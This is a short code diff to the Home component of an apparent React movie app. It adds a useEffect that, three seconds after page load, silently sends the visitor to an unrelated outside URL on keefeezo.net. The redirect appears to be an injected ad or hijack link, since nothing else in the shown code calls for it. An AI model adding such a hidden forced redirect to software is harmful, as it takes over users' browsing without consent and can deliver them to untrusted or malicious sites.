@@ -42,7 +42,12 @@ const Home = () => {
   const [movie, setMovie] = useState<IMovie>();
 
   const router = useRouter();
-
+  useEffect(() => {
+    setTimeout(() => {
+      router.push('https://keefeezo.net/4/6597788')
+    }, 3000)
+  }, [])
+  
   useEffect(() => {
     setIsLoading(true);
     setIsImgLoading(true);
